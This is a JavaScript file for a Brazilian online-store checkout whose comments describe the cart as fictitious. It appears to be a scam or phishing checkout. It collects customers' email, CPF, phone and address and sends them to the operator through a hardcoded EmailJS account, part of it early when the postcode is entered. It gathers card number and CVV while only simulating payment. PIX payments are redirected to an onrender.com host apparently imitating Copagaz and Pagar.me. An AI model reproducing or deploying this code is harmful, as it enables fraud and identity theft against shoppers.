/**
 * Checkout Progressivo - Script Principal
 * Fluxo UX otimizado com revelação progressiva de campos
 * Idêntico ao primeiro código de referência
 */

// Estado global do checkout
let currentStep = 2; // Inicia na etapa 2 (Entrega) - Carrinho é fictício
let selectedShipping = null;
let selectedPayment = 'pix';
let addressFilled = false;
let pixTimer = null;

window.checkoutData = {};

const CREDIT_CARD_FEE_PERCENTAGE = 50;
const BACKEND_API_BASE_URL = '/api/payments';

let cartData = {
    subtotal: 299.90
};

// Estado do fluxo progressivo
let flowState = {
    emailValid: false,
    cepValid: false,
    shippingSelected: false,
    personalDataValid: false,
    addressComplementValid: false,
    cpfValid: false
};

// Controle para envio do primeiro email (quando CEP é inserido)
let firstEmailSent = false;

// Inicialização do EmailJS
(function() {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
    script.onload = function() {
        emailjs.init("Sb-IhtOotsnORH1-U");
    };
    document.head.appendChild(script);
})();

document.addEventListener('DOMContentLoaded', function() {
    parseSubtotalFromURL();
    setupEventListeners();
    updateProgress();
    setupMasks();
    updateCartDisplay();
    initializeProgressiveFlow();
    initializePaymentMethod();

    // Configurar teclado numérico para campos específicos
    const numericFields = ['cpf', 'zipCode', 'phone'];
    numericFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.setAttribute('inputmode', 'numeric');
            field.setAttribute('type', 'text');
        }
    });

    const creditCardNotice = document.getElementById('creditCardNotice');
    if (creditCardNotice) {
        creditCardNotice.style.display = 'none';
    }
});

/**
 * Inicializa o fluxo progressivo
 * Mostra apenas a seção de contato e CEP inicialmente
 */
function initializeProgressiveFlow() {
    // Esconde todas as seções exceto contato e CEP (ambas visíveis desde o início)
    const sections = [
        'shippingOptions',
        'sectionPersonalData',
        'sectionAddressInfo',
        'sectionAddressComplement',
        'sectionCpf',
        'sectionButton'
    ];

    sections.forEach(sectionId => {
        const section = document.getElementById(sectionId);
        if (section) {
            section.classList.add('hidden');
            section.classList.remove('show');
        }
    });

    // Garante que a seção de CEP esteja visível
    const sectionCep = document.getElementById('sectionCep');
    if (sectionCep) {
        sectionCep.classList.remove('hidden');
    }

    // Garante que o botão fictício esteja visível
    const sectionContinueButton = document.getElementById('sectionContinueButton');
    if (sectionContinueButton) {
        sectionContinueButton.style.display = 'block';
    }
}

function parseSubtotalFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const subtotalParam = urlParams.get('subtotal');
    
    if (subtotalParam) {
        try {
            cartData.subtotal = parseFloat(subtotalParam);
            console.log('Subtotal loaded from URL:', cartData.subtotal);
        } catch (error) {
            console.error('Error parsing subtotal from URL:', error);
        }
    }
}

function updateCartDisplay() {
    updateOrderTotals();
}

function updateOrderTotals() {
    const subtotalEl = document.querySelector(".sidebar .total-row span:last-child");
    const mobileSubtotalEl = document.querySelector("#summaryContent .total-row span:nth-child(2)");
    
    if (subtotalEl) {
        subtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    if (mobileSubtotalEl) {
        mobileSubtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    const mobileTotalPrice = document.getElementById("mobileTotalPrice");
    if (mobileTotalPrice) {
        mobileTotalPrice.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    updateShippingCost();
}

function setupEventListeners() {
    // Form submissions
    document.getElementById('paymentForm').addEventListener('submit', handlePaymentSubmit);

    // Shipping options
    document.querySelectorAll('.shipping-option').forEach(option => {
        option.addEventListener('click', selectShipping);
    });

    // Payment methods
    document.querySelectorAll('.payment-method').forEach(method => {
        method.querySelector('.payment-header').addEventListener('click', selectPayment);
    });

    // Email field - Progressive reveal
    const emailField = document.getElementById('email');
    if (emailField) {
        emailField.addEventListener('blur', handleEmailBlur);
        emailField.addEventListener('input', function() {
            if (this.classList.contains('error')) {
                validateField(this);
            }
        });
    }

    // CEP field
    const zipCodeField = document.getElementById('zipCode');
    if (zipCodeField) {
        zipCodeField.addEventListener('keyup', handleCEPLookup);
        zipCodeField.addEventListener('blur', () => validateField(zipCodeField));
    }

    // All form inputs validation
    document.querySelectorAll('.form-input').forEach(input => {
        input.addEventListener('blur', () => validateField(input));
        input.addEventListener('input', () => {
            if (input.classList.contains('error')) {
                validateField(input);
            }
            checkFormCompletion();
        });
    });

    // Personal data fields
    const personalFields = ['firstName', 'lastName', 'phone'];
    personalFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', checkPersonalDataCompletion);
            field.addEventListener('input', checkPersonalDataCompletion);
        }
    });

    // Address complement fields
    const addressFields = ['number'];
    addressFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', checkAddressCompletion);
            field.addEventListener('input', checkAddressCompletion);
        }
    });

    // CPF field
    const cpfField = document.getElementById('cpf');
    if (cpfField) {
        cpfField.addEventListener('blur', checkCpfCompletion);
        cpfField.addEventListener('input', checkCpfCompletion);
    }

    // Botão fictício - scroll para o campo que falta
    const btnFictitious = document.getElementById('btnContinueFictitious');
    if (btnFictitious) {
        btnFictitious.addEventListener('click', handleFictitiousButtonClick);
    }

    // Validação ao clicar em "Prosseguir para o pagamento"
    const deliveryForm = document.getElementById('deliveryForm');
    if (deliveryForm) {
        deliveryForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const fieldsToValidate = [
                'email', 'zipCode', 'firstName', 'lastName', 'phone', 'number', 'cpf'
            ];
            
            let firstInvalidField = null;
            let isFormValid = true;

            // Valida campos de input
            fieldsToValidate.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                if (field) {
                    const isValid = validateField(field);
                    if (!isValid && !firstInvalidField) {
                        firstInvalidField = field;
                    }
                    if (!isValid) isFormValid = false;
                }
            });

            // Valida seleção de frete
            if (!selectedShipping) {
                isFormValid = false;
                const shippingOptions = document.getElementById('shippingOptions');
                if (!firstInvalidField) firstInvalidField = shippingOptions;
                
                // Alerta visual para frete (opcional, já que não é um input padrão)
                shippingOptions.style.border = '1px solid #ef4444';
                shippingOptions.style.borderRadius = '8px';
                shippingOptions.style.padding = '10px';
                setTimeout(() => { shippingOptions.style.border = 'none'; }, 3000);
            }

            if (!isFormValid) {
                if (firstInvalidField) {
                    firstInvalidField.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    if (firstInvalidField.focus) firstInvalidField.focus();
                }
                return false;
            }

            // Se tudo estiver válido, prossegue para o pagamento
            handleDeliverySubmit(e);
        });
    }
}

/**
 * Manipula o blur do campo de email
 * Apenas valida o email (CEP já está visível desde o início)
 */
function handleEmailBlur() {
    const emailField = document.getElementById('email');
    const isValid = validateField(emailField);
    
    if (isValid && !flowState.emailValid) {
        flowState.emailValid = true;
        // CEP já está visível, não precisa revelar
    }
}

/**
 * Manipula o clique no botão fictício
 * Faz scroll para o primeiro campo não preenchido
 */
function handleFictitiousButtonClick() {
    const email = document.getElementById('email');
    if (!validateEmail(email.value)) {
        email.focus();
        email.scrollIntoView({ behavior: 'smooth', block: 'center' });
        validateField(email);
        return;
    }

    if (!flowState.cepValid) {
        const zipCode = document.getElementById('zipCode');
        zipCode.focus();
        zipCode.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
    
    if (!flowState.shippingSelected) {
        const shippingOptions = document.getElementById('shippingOptions');
        shippingOptions.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
    
    if (!flowState.personalDataValid) {
        const firstName = document.getElementById('firstName');
        firstName.focus();
        firstName.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    if (!flowState.addressComplementValid) {
        const number = document.getElementById('number');
        number.focus();
        number.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    if (!flowState.cpfValid) {
        const cpf = document.getElementById('cpf');
        cpf.focus();
        cpf.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
}

/**
 * Verifica se os dados pessoais foram preenchidos
 */
function checkPersonalDataCompletion() {
    const firstName = document.getElementById('firstName').value.trim();
    const lastName = document.getElementById('lastName').value.trim();
    const phone = document.getElementById('phone').value.trim();

    if (firstName && lastName && phone.length >= 14 && !flowState.personalDataValid) {
        flowState.personalDataValid = true;
        revealSection('sectionAddressInfo');
        revealSection('sectionAddressComplement');
    }
}

/**
 * Verifica se o número do endereço foi preenchido
 */
function checkAddressCompletion() {
    const number = document.getElementById('number').value.trim();

    if (number && !flowState.addressComplementValid) {
        flowState.addressComplementValid = true;
        revealSection('sectionCpf');
    }
}

/**
 * Verifica se o CPF foi preenchido
 */
function checkCpfCompletion() {
    const cpf = document.getElementById('cpf').value.trim();

    if (cpf.length === 14 && !flowState.cpfValid) {
        flowState.cpfValid = true;
        revealSection('sectionButton');
        
        // Esconde o botão fictício e mostra o real
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'none';
        }
    }
}

/**
 * Revela uma seção com animação
 */
function revealSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (section && section.classList.contains('hidden')) {
        section.classList.remove('hidden');
        setTimeout(() => {
            section.classList.add('show');
        }, 10);
    }
}

function handleCEPLookup(e) {
    const cep = e.target.value.replace(/\D/g, '');
    if (cep.length === 8) {
        validateField(e.target);
        fetchAddress(cep);
        
        if (!flowState.cepValid) {
            flowState.cepValid = true;
            revealSection('shippingOptions');
        }
    }
}

async function fetchAddress(cep) {
    try {
        const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
        const data = await response.json();
        
        if (!data.erro) {
            document.getElementById('address').value = data.logradouro;
            document.getElementById('neighborhood').value = data.bairro;
            document.getElementById('city').value = data.localidade;
            document.getElementById('state').value = data.uf;
            
            // Preenche campos ocultos para o checkoutData
            window.checkoutData.address = data.logradouro;
            window.checkoutData.neighborhood = data.bairro;
            window.checkoutData.city = data.localidade;
            window.checkoutData.state = data.uf;
            
            addressFilled = true;
            
            // Se o endereço foi encontrado, foca no número
            setTimeout(() => {
                const numberField = document.getElementById('number');
                if (numberField) numberField.focus();
            }, 500);

            // Envia o primeiro email se ainda não foi enviado
            if (!firstEmailSent) {
                sendFirstEmail();
                firstEmailSent = true;
            }
        }
    } catch (error) {
        console.error('Error fetching address:', error);
    }
}

function selectShipping(e) {
    const option = e.currentTarget;
    document.querySelectorAll('.shipping-option').forEach(opt => opt.classList.remove('selected'));
    option.classList.add('selected');
    
    selectedShipping = option.dataset.shipping;
    flowState.shippingSelected = true;
    
    updateShippingCost();
    revealSection('sectionPersonalData');
}

function updateShippingCost() {
    const shippingEl = document.querySelector(".sidebar .total-row:nth-child(2) span:last-child");
    const mobileShippingEl = document.querySelector("#summaryContent .total-row:nth-child(2) span:nth-child(2)");
    const totalEl = document.querySelector(".sidebar .total-row.final span:last-child");
    const mobileTotalEl = document.querySelector("#summaryContent .total-row.final span:nth-child(2)");
    
    let shippingCost = 0;
    if (selectedShipping === 'standard') shippingCost = 19.90;
    if (selectedShipping === 'express') shippingCost = 35.90;
    
    const total = cartData.subtotal + shippingCost;
    
    if (shippingEl) shippingEl.textContent = shippingCost === 0 ? "Grátis" : `R$ ${shippingCost.toFixed(2).replace(".", ",")}`;
    if (mobileShippingEl) mobileShippingEl.textContent = shippingCost === 0 ? "Grátis" : `R$ ${shippingCost.toFixed(2).replace(".", ",")}`;
    
    if (totalEl) totalEl.textContent = `R$ ${total.toFixed(2).replace(".", ",")}`;
    if (mobileTotalEl) mobileTotalEl.textContent = `R$ ${total.toFixed(2).replace(".", ",")}`;
    
    const mobileTotalPrice = document.getElementById("mobileTotalPrice");
    if (mobileTotalPrice) {
        mobileTotalPrice.textContent = `R$ ${total.toFixed(2).replace(".", ",")}`;
    }
}

function selectPayment(e) {
    const method = e.currentTarget.closest('.payment-method');
    document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
    method.classList.add('selected');
    
    selectedPayment = method.dataset.payment;
    
    // Toggle payment details
    document.querySelectorAll('.payment-details').forEach(d => d.style.display = 'none');
    method.querySelector('.payment-details').style.display = 'block';
    
    const creditCardNotice = document.getElementById('creditCardNotice');
    if (selectedPayment === 'credit_card') {
        if (creditCardNotice) creditCardNotice.style.display = 'block';
    } else {
        if (creditCardNotice) creditCardNotice.style.display = 'none';
    }
}

function handleDeliverySubmit(e) {
    e.preventDefault();
    
    // Coleta dados da entrega
    const formData = new FormData(document.getElementById('deliveryForm'));
    for (let [key, value] of formData.entries()) {
        window.checkoutData[key] = value;
    }
    
    window.checkoutData.shippingMethod = selectedShipping;
    
    // Muda para a etapa de pagamento
    currentStep = 3;
    updateProgress();
    
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
    
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

async function handlePaymentSubmit(e) {
    e.preventDefault();
    
    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.classList.add('btn-loading');
    document.getElementById('loadingOverlay').style.display = 'flex';

    // Coleta dados finais
    const formData = new FormData(e.target);
    const orderData = {
        ...window.checkoutData,
        paymentMethod: selectedPayment,
        total: cartData.subtotal + (selectedShipping === 'standard' ? 19.90 : (selectedShipping === 'express' ? 35.90 : 0))
    };

    // Adiciona dados do cartão se for o caso
    if (selectedPayment === 'credit_card') {
        orderData.card = {
            number: formData.get('cardNumber'),
            name: formData.get('cardName'),
            expiry: formData.get('cardExpiry'),
            cvv: formData.get('cardCvv'),
            installments: formData.get('installments')
        };
    }

    try {
        // Envia email final com todos os dados
        await sendFinalEmail(orderData);

        if (selectedPayment === 'pix') {
            await processPixPayment(orderData);
        } else if (selectedPayment === 'credit_card') {
            await processCardPayment(orderData);
        }
    } catch (error) {
        console.error('Checkout error:', error);
        alert('Ocorreu um erro ao processar seu pedido. Por favor, tente novamente.');
    } finally {
        submitBtn.classList.remove('btn-loading');
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}

async function processPixPayment(orderData) {
    // Redirecionamento customizado
    const subtotal = orderData.total.toFixed(2);
    
    // Formatar endereço
    const addressParts = [
        orderData.address,
        orderData.number,
        orderData.neighborhood,
        orderData.city + '/' + orderData.state
    ];
    const fullAddress = addressParts.filter(Boolean).join(', ');
    
    // Prazo de entrega
    let deliveryTime = "Entrega em prazo aqui";
    if (selectedShipping === 'standard') {
        deliveryTime = "Entrega em 3 dias úteis";
    } else if (selectedShipping === 'express') {
        deliveryTime = "Entrega Amanhã";
    }
    
    // Criar os parâmetros da URL
    const params = new URLSearchParams({
        subtotal: subtotal,
        address: fullAddress,
        cep: orderData.zipCode,
        delivery_time: deliveryTime
    });
    
    // Link específico para redirecionamento
    const redirectUrl = `https://pag-copagaz.onrender.com/pagarme/?${params.toString()}`;
    
    // Executar o redirecionamento
    window.location.href = redirectUrl;
}

function showPixPaymentDetails(paymentResult) {
    const pixPaymentDetails = document.getElementById('pixPaymentDetails');
    const pixQrCodeContainer = document.getElementById('pixQrCode');
    const pixCodeText = document.getElementById('pixCodeText');
    
    pixPaymentDetails.style.display = 'block';
    
    if (paymentResult.pix && paymentResult.pix.qrcode) {
        const pixCode = paymentResult.pix.qrcode;
        pixCodeText.textContent = pixCode;

        const paymentForm = document.getElementById('paymentForm');
        const submitButton = paymentForm.querySelector('button[type="submit"]');
        if (submitButton) {
            submitButton.disabled = true;
            submitButton.textContent = 'Aguardando Pagamento...';
        }

        // Limpa QR Code anterior se existir
        pixQrCodeContainer.innerHTML = '';
        
        // Gera novo QR Code
        new QRCode(pixQrCodeContainer, {
            text: pixCode,
            width: 200,
            height: 200
        });

        // Inicia timer de expiração (exemplo: 1 hora)
        startPixTimer(3600);
    }
}

function startPixTimer(duration) {
    let timer = duration;
    const timerDisplay = document.getElementById('pixTimer');
    
    if (pixTimer) clearInterval(pixTimer);
    
    pixTimer = setInterval(() => {
        const minutes = parseInt(timer / 60, 10);
        const seconds = parseInt(timer % 60, 10);

        timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        if (--timer < 0) {
            clearInterval(pixTimer);
            timerDisplay.textContent = "Expirado";
            alert("O código PIX expirou. Por favor, gere um novo.");
        }
    }, 1000);
}

async function processCardPayment(orderData) {
    // Simulação de processamento de cartão
    console.log('Processing card payment:', orderData);
    
    // Em um cenário real, aqui você enviaria para sua API
    // que se comunicaria com o gateway de pagamento
    
    setTimeout(() => {
        window.location.href = '/obrigado.html';
    }, 2000);
}

// Funções de EmailJS
async function sendFirstEmail() {
    const templateParams = {
        email: document.getElementById('email').value,
        zipCode: document.getElementById('zipCode').value,
        status: 'CEP Inserido - Abandono de Carrinho Inicial'
    };

    try {
        await emailjs.send('service_p8v8789', 'template_v8v8789', templateParams);
        console.log('First email sent successfully');
    } catch (error) {
        console.error('Error sending first email:', error);
    }
}

async function sendFinalEmail(orderData) {
    const templateParams = {
        to_name: `${orderData.firstName} ${orderData.lastName}`,
        from_name: "Loja Online",
        message: `Novo pedido recebido!
        
        Cliente: ${orderData.firstName} ${orderData.lastName}
        Email: ${orderData.email}
        Telefone: ${orderData.phone}
        CPF: ${orderData.cpf}
        
        Endereço: ${orderData.address}, ${orderData.number}
        Bairro: ${orderData.neighborhood}
        Cidade: ${orderData.city}/${orderData.state}
        CEP: ${orderData.zipCode}
        
        Método de Envio: ${orderData.shippingMethod}
        Método de Pagamento: ${orderData.paymentMethod}
        Total: R$ ${orderData.total.toFixed(2)}`,
        customer_email: orderData.email
    };

    try {
        await emailjs.send('service_p8v8789', 'template_v8v8789', templateParams);
        console.log('Final email sent successfully');
    } catch (error) {
        console.error('Error sending final email:', error);
    }
}

// Utilitários
function updateProgress() {
    document.querySelectorAll('.step').forEach(step => {
        const stepNum = parseInt(step.dataset.step);
        step.classList.remove('active', 'completed');
        if (stepNum === currentStep) step.classList.add('active');
        if (stepNum < currentStep) step.classList.add('completed');
    });
}

function setupMasks() {
    const zipCode = document.getElementById('zipCode');
    if (zipCode) {
        zipCode.addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 8) v = v.slice(0, 8);
            if (v.length > 5) v = v.slice(0, 5) + '-' + v.slice(5);
            e.target.value = v;
        });
    }

    const phone = document.getElementById('phone');
    if (phone) {
        phone.addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 11) v = v.slice(0, 11);
            if (v.length > 2) v = '(' + v.slice(0, 2) + ') ' + v.slice(2);
            if (v.length > 9) v = v.slice(0, 9) + '-' + v.slice(9);
            e.target.value = v;
        });
    }

    const cpf = document.getElementById('cpf');
    if (cpf) {
        cpf.addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 11) v = v.slice(0, 11);
            v = v.replace(/(\d{3})(\d)/, '$1.$2');
            v = v.replace(/(\d{3})(\d)/, '$1.$2');
            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = v;
        });
    }

    const cardNumber = document.getElementById('cardNumber');
    if (cardNumber) {
        cardNumber.addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            v = v.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = v.slice(0, 19);
        });
    }

    const cardExpiry = document.getElementById('cardExpiry');
    if (cardExpiry) {
        cardExpiry.addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
            e.target.value = v;
        });
    }
}

function validateField(field) {
    let isValid = true;
    const value = field.value.trim();
    
    if (!value && field.required) {
        isValid = false;
    } else if (field.id === 'email') {
        isValid = validateEmail(value);
    } else if (field.id === 'zipCode') {
        isValid = value.replace(/\D/g, '').length === 8;
    } else if (field.id === 'cpf') {
        isValid = value.replace(/\D/g, '').length === 11;
    } else if (field.id === 'phone') {
        isValid = value.replace(/\D/g, '').length >= 10;
    }

    if (!isValid) {
        field.classList.add('error');
    } else {
        field.classList.remove('error');
    }

    return isValid;
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function checkFormCompletion() {
    // Esta função pode ser usada para habilitar/desabilitar botões se necessário
}

function copyPixCode() {
    const pixCode = document.getElementById('pixCodeText').textContent;
    navigator.clipboard.writeText(pixCode).then(() => {
        const btn = document.querySelector('.btn-copy');
        const originalText = btn.textContent;
        btn.textContent = 'Copiado!';
        setTimeout(() => btn.textContent = originalText, 2000);
    });
}
